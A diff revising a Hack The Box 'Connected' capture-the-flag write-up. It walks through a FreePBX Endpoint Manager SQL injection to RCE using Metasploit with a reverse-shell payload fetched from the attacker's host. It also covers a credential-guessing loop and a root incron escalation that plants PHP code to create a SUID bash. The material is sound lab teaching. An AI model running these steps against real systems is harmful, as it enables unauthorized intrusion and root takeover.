@@ -1,73 +1,85 @@
-# Hack The Box: Connected Writeup
+# HTB Connected
 
 ## Overview
 
-Connected is an easy-difficulty Linux machine focused on FreePBX exploitation and privilege escalation through insecure system automation. The initial foothold comes from an unauthenticated SQL injection in FreePBX Endpoint Manager, which can be chained into command execution. Privilege escalation is achieved by abusing a root-run HA trigger script that loads attacker-controlled PHP code from a writable FreePBX module path.
+- Season: 11
+- Difficulty: Easy
+- OS: Linux
+- Initial Access: FreePBX Endpoint Manager SQLi to RCE
+- Privilege Escalation: Writable FreePBX HA module loaded by root incron trigger
 
-> Flags are intentionally redacted in this writeup.
+> Flags, target IPs, and sensitive values are redacted.
 
-## Target
+## Executive Summary
 
-```text
-Target IP: 10.129.105.220
-Hostname: connected.htb
-OS: Linux
-Application: FreePBX 16.0.40.7
-```
+Connected exposed a FreePBX administration portal over HTTP and HTTPS. The visible version was FreePBX `16.0.40.7`, which matched CVE-2025-57819, an unauthenticated SQL injection in the Endpoint Manager component.
 
-I added the hostname to `/etc/hosts`:
+The Metasploit module for the issue initially failed when the FreePBX URI was set to `/admin`. Changing `TARGETURI` to `/` allowed the module to detect the SQL injection, create the cron job, and return a shell as `asterisk`.
+
+Privilege escalation came from `incrond`. A root-owned incron rule watched `/usr/local/asterisk/ha_trigger` and executed `/usr/sbin/sysadmin_ha`. Inspecting that script revealed that it loaded `/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php` and called `rootTrigger()`. Since the FreePBX modules directory was writable by `asterisk`, a malicious PHP class was placed at that path to create a SUID copy of Bash.
+
+## Attack Path
+
+1. Enumerated SSH, HTTP, and HTTPS.
+2. Added `connected.htb` and `pbxconnect` to `/etc/hosts`.
+3. Identified FreePBX `16.0.40.7` from `/admin/config.php`.
+4. Tested UCP, SIP, API, and virtual-host paths without finding credentials or a useful leak.
+5. Matched the FreePBX version to CVE-2025-57819.
+6. Used Metasploit `freepbx_unauth_sqli_to_rce`.
+7. Fixed exploitation by setting `TARGETURI /`.
+8. Got a shell as `asterisk`.
+9. Found writable incron trigger files and root incron rules.
+10. Inspected `/usr/sbin/sysadmin_ha`.
+11. Found the exact root-loaded PHP path.
+12. Wrote a malicious `incron` class with `rootTrigger()`.
+13. Triggered `/usr/local/asterisk/ha_trigger`.
+14. Used the created SUID Bash binary to read the root flag.
+
+## Reconnaissance
+
+Initial scan:
 
 ```bash
-export IP=10.129.105.220
-sudo sed -i '/connected.htb/d;/pbxconnect/d' /etc/hosts
-echo "$IP connected.htb pbxconnect" | sudo tee -a /etc/hosts
+sudo nmap -sCV -p22,80,443 TARGET_IP
 ```
 
-## Enumeration
-
-Initial service enumeration showed only SSH and web services:
-
-```bash
-sudo nmap -sCV -p 22,80,443 -oN scans/nmap-10.129.105.220.txt $IP
-```
-
-Relevant results:
+Findings:
 
 ```text
-22/tcp  open  ssh       OpenSSH 7.4
-80/tcp  open  http      Apache httpd 2.4.6, PHP 7.4.16
-443/tcp open  ssl/http  Apache httpd 2.4.6, PHP 7.4.16
+22/tcp   SSH
+80/tcp   Apache httpd 2.4.6, PHP 7.4.16
+443/tcp  Apache httpd 2.4.6, PHP 7.4.16
 ```
 
-HTTP redirected to the FreePBX administration interface:
+The hostnames were added locally:
+
+```bash
+echo "TARGET_IP connected.htb pbxconnect" | sudo tee -a /etc/hosts
+```
+
+The web root redirected toward FreePBX:
 
 ```bash
 curl -I http://connected.htb/
 curl -I http://connected.htb/admin/config.php
 ```
 
-The web page identified the application:
+The application disclosed:
 
 ```text
 FreePBX Administration
 FreePBX 16.0.40.7
 ```
 
-The TLS certificate also exposed the common name:
+Why this mattered:
 
-```text
-commonName=pbxconnect
-```
-
-So I mapped both names:
-
-```text
-10.129.105.220 connected.htb pbxconnect
-```
+- FreePBX was the main attack surface.
+- The exact version made vulnerability research useful.
+- The TLS certificate exposed `pbxconnect`, but it did not reveal a separate application.
 
 ## Web Enumeration
 
-The main visible paths were:
+Useful visible paths:
 
 ```text
 /admin/config.php
@@ -76,7 +88,7 @@ The main visible paths were:
 /admin/api/
 ```
 
-Directory fuzzing found mostly expected FreePBX paths:
+Directory fuzzing:
 
 ```bash
 ffuf -u http://connected.htb/admin/FUZZ \
@@ -86,7 +98,7 @@ ffuf -u http://connected.htb/admin/FUZZ \
   -fs 204,206,207,208,209,210,211,212
 ```
 
-Interesting hits:
+Main hits:
 
 ```text
 /admin/config.php
@@ -96,210 +108,147 @@ Interesting hits:
 /admin/views
 ```
 
-I also tested virtual hosts:
+Virtual-host fuzzing did not produce a useful result:
 
 ```bash
-ffuf -u http://10.129.105.220/ \
+ffuf -u http://TARGET_IP/ \
   -H "Host: FUZZ.connected.htb" \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -fs 229
+  -fs NORMAL_RESPONSE_SIZE
 ```
 
-No useful vhost was found.
+## Dead Ends
 
-## Failed and Non-Useful Paths
+### Hidden Login Key
 
-### Hidden `key` Value
-
-The FreePBX login page contained a hidden-looking value:
+The FreePBX login page contained a hidden-looking value inside:
 
 ```html
-<div id="key" style="color: white;font-size:small">
-    ...
-</div>
+<div id="key">
 ```
 
-At first I tested it as a password for:
+It was tested as a possible password for `admin` and common UCP extensions, but all attempts failed. Browser storage showed the value was only the PHP session ID.
 
-```text
-admin:<key>
-100:<key>
-101:<key>
-1000:<key>
-```
+### UCP
 
-All failed. Looking at browser storage showed this value was simply the `PHPSESSID`, not a credential.
-
-### UCP Login and Forgot Password
-
-The UCP login page was available:
+The UCP portal was reachable:
 
 ```text
 http://connected.htb/ucp/
 ```
 
-The JavaScript showed login used:
+The JavaScript showed the login and forgot-password actions:
 
 ```text
 module=User&command=login
-```
-
-Forgot password used:
-
-```text
-/ucp/index.php
 quietmode=1&module=User&command=forgot
 ```
 
-I tested forgot-password behavior:
-
-```bash
-curl -sL -c ucp-cookies.txt http://connected.htb/ucp/ -o ucp.html
-TOKEN=$(grep -oP 'name="token" value="\K[^"]+' ucp.html)
-
-curl -sL -b ucp-cookies.txt -c ucp-cookies.txt \
-  -H 'X-Requested-With: XMLHttpRequest' \
-  -e 'http://connected.htb/ucp/' \
-  -X POST 'http://connected.htb/ucp/index.php' \
-  --data-urlencode "token=$TOKEN" \
-  --data-urlencode "username=999999" \
-  --data-urlencode "email=" \
-  --data-urlencode "quietmode=1" \
-  --data-urlencode "module=User" \
-  --data-urlencode "command=forgot"
-```
-
-It returned:
+Forgot-password returned the same response for real-looking and fake users:
 
 ```json
 {"status":true,"message":"Submitted"}
 ```
 
-The same response appeared for invalid users, so there was no username leak.
+This meant it was not useful for user enumeration.
 
-I also tested common UCP credentials:
+Common UCP credentials were also tested:
 
-```bash
-for u in 100 101 102 200 201 1000; do
-  for p in "$u" password 1234 123456 voicemail changeme; do
-    curl -sL -c ucp-cookies.txt http://connected.htb/ucp/ -o ucp.html
-    TOKEN=$(grep -oP 'name="token" value="\K[^"]+' ucp.html)
-    r=$(curl -sL -b ucp-cookies.txt -c ucp-cookies.txt \
-      -H 'X-Requested-With: XMLHttpRequest' \
-      -e 'http://connected.htb/ucp/' \
-      -X POST 'http://connected.htb/ucp/' \
-      --data-urlencode "token=$TOKEN" \
-      --data-urlencode "username=$u" \
-      --data-urlencode "password=$p" \
-      --data-urlencode "module=User" \
-      --data-urlencode "command=login")
-    echo "$u:$p -> $r"
-  done
-done
+```text
+100:100
+101:101
+102:102
+password
+1234
+123456
+voicemail
+changeme
 ```
 
-All returned invalid credentials.
+All failed.
 
-### SIP Enumeration
+### SIP
 
-Because this is a PBX, I checked SIP:
+SIP was checked because this was a PBX:
 
 ```bash
-sudo nmap -sU -sV -p 5060,5160 --script sip-methods,sip-enum-users -oN scans/sip.txt $IP
-svwar -m OPTIONS -e100-999 $IP
+sudo nmap -sU -sV -p5060,5160 --script sip-methods,sip-enum-users TARGET_IP
+svwar -m OPTIONS -e100-999 TARGET_IP
 ```
 
-The ports appeared `open|filtered`, but enumeration timed out and did not produce valid extensions.
+The ports were `open|filtered`, but enumeration timed out and did not produce valid extensions.
 
-### FreePBX API
+### API
 
-The API route existed:
+The FreePBX API existed:
 
 ```text
 /admin/api/api/gql
 /admin/api/api/token
 ```
 
-GraphQL required a JWT:
+GraphQL required a bearer token:
 
 ```json
 {"error":"access_denied","hint":"Missing \"Authorization\" header"}
 ```
 
-The token endpoint required OAuth client credentials:
+The OAuth token endpoint required valid client credentials:
 
 ```json
 {"error":"invalid_client","message":"Client authentication failed"}
 ```
 
-I tested obvious OAuth client IDs and secrets, but none worked:
+Obvious client IDs and secrets failed, so this was not the entry point.
 
-```bash
-for c in admin:admin admin:password admin:changeme freepbx:freepbx; do
-  curl -s -i -u "$c" \
-    -X POST 'http://connected.htb/admin/api/api/token' \
-    -H 'Content-Type: application/x-www-form-urlencoded' \
-    --data 'grant_type=client_credentials'
-done
-```
+## Initial Access
 
-This path did not provide access.
-
-## Initial Foothold
-
-Version research led to CVE-2025-57819, an unauthenticated SQL injection in the FreePBX Endpoint Manager component. The Metasploit module was:
+The vulnerable component was FreePBX Endpoint Manager. The exploit used was:
 
 ```text
 exploit/unix/http/freepbx_unauth_sqli_to_rce
 ```
 
-Initial attempts failed:
+The first attempts failed:
 
 ```text
 payload-failed: Cronjob was not created
-Cronjob not removed, please perform manual cleanup!
+No SQL injection detected, target is patched
 ```
 
-The important fix was `TARGETURI`. I originally used:
+The mistake was `TARGETURI`:
 
 ```text
 set TARGETURI /admin
 ```
 
-That caused the module check to report:
-
-```text
-No SQL injection detected, target is patched
-```
-
-Changing it to `/` fixed exploitation:
+The working value was:
 
 ```text
 set TARGETURI /
 ```
 
-Working Metasploit settings:
+Working options:
 
 ```text
-use exploit/unix/http/freepbx_unauth_sqli_to_rce
-set RHOSTS 10.129.105.220
+set RHOSTS TARGET_IP
 set VHOST connected.htb
 set TARGETURI /
-set LHOST 10.10.14.55
-set FETCH_SRVHOST 10.10.14.55
+set LHOST TUN0_IP
+set FETCH_SRVHOST TUN0_IP
 set FETCH_WRITABLE_DIR /tmp
 set FETCH_COMMAND WGET
 set payload cmd/linux/http/x64/shell/reverse_tcp
 run
 ```
 
-I also lowered the VPN MTU, which helped with staged payload delivery:
+The VPN MTU was lowered to avoid staged payload issues:
 
 ```bash
 sudo ip link set dev tun0 mtu 1200
 ```
 
-Successful output:
+Successful result:
 
 ```text
 The target is vulnerable. Detected SQL injection
@@ -307,7 +256,7 @@ Created cronjob
 Command shell session opened
 ```
 
-The shell landed as:
+Shell context:
 
 ```bash
 whoami
@@ -319,17 +268,15 @@ asterisk
 uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
 ```
 
-The user flag was located at:
+User flag:
 
 ```bash
 cat /home/asterisk/user.txt
 ```
 
-```text
-HTB{redacted}
-```
+## Shell Upgrade
 
-I stabilized the shell with Python:
+Python 3 was not available, but Python was:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -338,38 +285,23 @@ export TERM=xterm
 
 ## Privilege Escalation Enumeration
 
-I searched for incron and automation-related files:
+Incron files were found:
 
 ```bash
 find / -name '*incron*' 2>/dev/null
 ```
 
-Important results:
+Important paths:
 
 ```text
 /etc/incron.d
-/etc/incron.d/local
-/etc/incron.d/sysadmin
-/var/spool/incron/root
 /usr/local/asterisk/ha_trigger
 /usr/local/asterisk/incron
 /var/spool/asterisk/sysadmin/incron_restart
 /usr/sbin/incrond
 ```
 
-The writable trigger files were:
-
-```bash
-ls -la /usr/local/asterisk/ha_trigger
-ls -la /var/spool/asterisk/sysadmin/incron_restart
-```
-
-```text
-/usr/local/asterisk/ha_trigger
-/var/spool/asterisk/sysadmin/incron_restart
-```
-
-The root incron configuration was readable through `/etc/incron.d`:
+The incron configuration showed root-controlled automation:
 
 ```bash
 for f in /etc/incron.d/*; do
@@ -378,88 +310,56 @@ for f in /etc/incron.d/*; do
 done
 ```
 
-Relevant entries:
+Relevant rules:
 
 ```text
-== /etc/incron.d/local ==
 /usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
-
-== /etc/incron.d/sysadmin ==
 /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
-
-== /etc/incron.d/legacy ==
 /usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
 ```
 
-The HA trigger was the useful path.
+The watched HA trigger was writable by `asterisk`:
 
-## Failed Privilege Escalation Attempts
+```bash
+ls -la /usr/local/asterisk/ha_trigger
+```
 
-### Wrong `freepbx_ha` Path
+Why this mattered:
 
-I first created:
+The compromised user could modify a file that root watched. The next step was to determine what the root-executed script loaded.
+
+## Failed Privilege Escalation Paths
+
+First, a payload was placed at:
 
 ```text
 /var/www/html/admin/modules/freepbx_ha/incron.php
 ```
 
-With:
+This did not work because `sysadmin_ha` did not load that file.
 
-```php
-<?php
-function rootTrigger() {
-    copy('/bin/bash', '/tmp/rootbash');
-    chmod('/tmp/rootbash', 04755);
-}
-?>
+Then the framework hook mechanism was tested:
+
+```text
+/usr/local/asterisk/incron/SYSTEM.rootbash
 ```
 
-Then triggered:
+This also failed because the framework hook system expects signed hook packages, not plain shell scripts.
+
+These failures were useful because they narrowed the target to the HA-specific script.
+
+## Finding The Correct Root-Loaded File
+
+The root-executed script was readable:
 
 ```bash
-echo 1 > /usr/local/asterisk/ha_trigger
-sleep 5
-ls -la /tmp/rootbash
-```
-
-This failed because `sysadmin_ha` did not load that path.
-
-### Wrong Framework Hook Format
-
-The file `/var/www/html/admin/modules/framework/hooks/README.md` explained that files placed in `/usr/local/asterisk/incron` are moved into the framework hooks directory and run if signed/valid.
-
-I tried a plain hook:
-
-```bash
-cat > /usr/local/asterisk/incron/SYSTEM.rootbash <<'EOF'
-#!/bin/bash
-cp /bin/bash /tmp/rootbash
-chmod 4755 /tmp/rootbash
-EOF
-```
-
-This also failed because the framework hook system expects signed/base64 hook packages, not arbitrary shell scripts.
-
-## Finding the Correct Execution Path
-
-The breakthrough came from inspecting `/usr/sbin/sysadmin_ha`:
-
-```bash
-file /usr/sbin/sysadmin_ha /usr/bin/sysadmin_manager
+file /usr/sbin/sysadmin_ha
 head -n 80 /usr/sbin/sysadmin_ha
-strings /usr/sbin/sysadmin_ha | grep -Ei 'php|freepbx|ha|trigger|module|incron|rootTrigger'
 ```
 
-The script showed the exact load path:
+Key logic:
 
 ```php
-#!/usr/bin/php -q
-<?php
-
-if (file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
-    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
-}
-
 $i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
 if (file_exists($i)) {
     require_once($i);
@@ -468,17 +368,22 @@ if (file_exists($i)) {
 }
 ```
 
-So the correct path was:
+So the expected file was:
 
 ```text
 /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
 ```
 
-The file also needed to define an `incron` class with a `rootTrigger()` method.
+It also needed to define:
+
+```text
+class incron
+method rootTrigger()
+```
 
 ## Root Exploit
 
-I created the expected module path and PHP class:
+Create the expected module path and PHP class:
 
 ```bash
 mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
@@ -496,7 +401,7 @@ class incron {
 EOF
 ```
 
-Then triggered the HA root workflow:
+Trigger the root workflow:
 
 ```bash
 echo 1 > /usr/local/asterisk/ha_trigger
@@ -504,13 +409,13 @@ sleep 5
 ls -la /tmp/rootbash
 ```
 
-The SUID bash binary appeared:
+Result:
 
 ```text
 -rwsr-xr-x 1 root root ... /tmp/rootbash
 ```
 
-Then I executed it with `-p` to preserve effective UID:
+Use the SUID binary:
 
 ```bash
 /tmp/rootbash -p
@@ -523,34 +428,45 @@ Result:
 uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
 ```
 
-Finally:
+Root flag:
 
 ```bash
 cat /root/root.txt
 ```
 
+## Attack Chain
+
 ```text
-HTB{redacted}
+FreePBX 16.0.40.7
+-> CVE-2025-57819 Endpoint Manager SQLi
+-> Metasploit RCE with TARGETURI /
+-> shell as asterisk
+-> writable /usr/local/asterisk/ha_trigger
+-> root incron executes /usr/sbin/sysadmin_ha
+-> sysadmin_ha loads freepbx_ha/functions.inc/incron.php
+-> malicious rootTrigger() creates SUID bash
+-> /tmp/rootbash -p
+-> root
 ```
 
-## Lessons Learned
+## Key Lessons
 
-- FreePBX version disclosure was the key to identifying the intended initial vulnerability.
-- The Metasploit module required `TARGETURI /`, not `/admin`.
-- The hidden login-page `key` was only a session ID, not a credential.
-- UCP forgot-password returned the same response for valid and invalid users, so it was not useful for user enumeration.
-- The privilege escalation required reading the actual root-executed script instead of assuming the module path.
-- The correct PE target was not `freepbx_ha/incron.php`; it was `freepbx_ha/functions.inc/incron.php`.
+- Version disclosure was enough to identify the intended initial exploit.
+- A small Metasploit option mismatch, `TARGETURI /admin` vs `/`, caused misleading failed checks.
+- The hidden login key was only a session ID.
+- UCP forgot-password did not leak valid usernames.
+- The privilege escalation required reading the root-executed script instead of guessing the module path.
+- The correct file was `freepbx_ha/functions.inc/incron.php`, not `freepbx_ha/incron.php`.
 
-## Cleanup Notes
+## Cleanup
 
-On a real assessment, cleanup would include removing:
+Artifacts created during exploitation:
 
-```bash
+```text
 /tmp/rootbash
-/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
 /var/www/html/admin/modules/freepbx_ha/incron.php
+/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
 /usr/local/asterisk/incron/SYSTEM.*
 ```
 
-For Hack The Box, resetting the machine is sufficient.
+On Hack The Box, resetting the machine is sufficient.
